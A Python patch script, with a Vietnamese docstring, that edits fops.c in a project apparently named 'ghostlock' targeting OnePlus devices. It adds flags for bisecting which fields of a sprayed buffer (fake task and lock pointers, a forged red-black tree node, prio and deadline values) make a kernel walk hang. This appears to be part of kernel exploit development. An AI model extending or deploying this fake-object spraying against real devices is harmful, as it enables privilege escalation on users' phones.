#!/usr/bin/env python3
"""patch_ssopt_isolate.py

Hai cờ để bisect BÊN TRONG bộ 3 field của paint (tìm field làm walk không trả về):
  SSOPT_NO_TREE=1 : không sơn tree_entry (buf[0x10..0x20] = 0) — vẫn sơn task/lock/prio
  SSOPT_NO_PRIO=1 : không sơn prio/deadline (paint_len = 0x50) — vẫn sơn tree_entry
Cả hai chỉ có tác dụng trong nhánh triple.
"""
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()

old = """      put64(buf, 0x10, ssopt_write_pc);
      put64(buf, 0x18, ssopt_write_right);
      put64(buf, 0x20, ssopt_write_left);"""
new = """      if (env_flag("SSOPT_NO_TREE", 0)) {
        /* isolation probe: leave the rb node "empty" (children/parent = 0) so
         * chain[7] takes the harmless case-1/parent-NULL path. */
        put64(buf, 0x10, 0);
        put64(buf, 0x18, 0);
        put64(buf, 0x20, 0);
      } else {
        put64(buf, 0x10, ssopt_write_pc);
        put64(buf, 0x18, ssopt_write_right);
        put64(buf, 0x20, ssopt_write_left);
      }"""
assert s.count(old) == 1, ("tree", s.count(old))
s = s.replace(old, new, 1)

old = """    socklen_t paint_len = (env_flag("SSOPT_BASELINE", 0) ||
                           env_flag("SSOPT_LOCKPROBE", 0)) ? 0x50 : 0x60;"""
new = """    /* SSOPT_NO_PRIO: stop before buf[0x50] (prio/deadline) so they keep their
     * stale values, exactly like the ghostlock53/54 baseline. */
    socklen_t paint_len = (env_flag("SSOPT_BASELINE", 0) ||
                           env_flag("SSOPT_LOCKPROBE", 0) ||
                           env_flag("SSOPT_NO_PRIO", 0)) ? 0x50 : 0x60;"""
assert s.count(old) == 1, ("len", s.count(old))
s = s.replace(old, new, 1)

old = """    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu "
            "scan=%d baseline=%d hold=%d quiet=%d owner0=%d\\n",
            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf,
            env_flag("SSOPT_SCAN", 0), env_flag("SSOPT_BASELINE", 0),
            env_flag("SSOPT_HOLD", 1), env_flag("SSOPT_QUIET_EXIT", 1),
            env_flag("SSOPT_OWNER0", 1));"""
new = """    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu "
            "scan=%d baseline=%d hold=%d quiet=%d owner0=%d no_tree=%d "
            "no_prio=%d lockprobe=%d\\n",
            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf,
            env_flag("SSOPT_SCAN", 0), env_flag("SSOPT_BASELINE", 0),
            env_flag("SSOPT_HOLD", 1), env_flag("SSOPT_QUIET_EXIT", 1),
            env_flag("SSOPT_OWNER0", 1), env_flag("SSOPT_NO_TREE", 0),
            env_flag("SSOPT_NO_PRIO", 0), env_flag("SSOPT_LOCKPROBE", 0));"""
assert s.count(old) == 1, ("log", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: SSOPT_NO_TREE / SSOPT_NO_PRIO isolation flags + richer settings log")
